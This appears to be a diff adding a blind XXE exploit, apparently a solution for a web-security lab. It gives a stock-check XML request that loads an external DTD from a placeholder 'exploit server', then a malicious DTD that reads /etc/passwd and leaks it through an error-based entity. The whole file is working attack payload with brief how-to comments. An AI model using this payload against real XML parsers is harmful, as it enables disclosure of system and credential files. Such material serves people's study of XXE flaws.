@@ -1,0 +1,10 @@
+<!--Insert This Payload Into Stock Check POST Data-->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "Insert Exploit Server"> %xxe;]>
+<stockCheck><productId>4</productId><storeId>1</storeId></stockCheck>
+
+<!--Place this into exploit server-->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
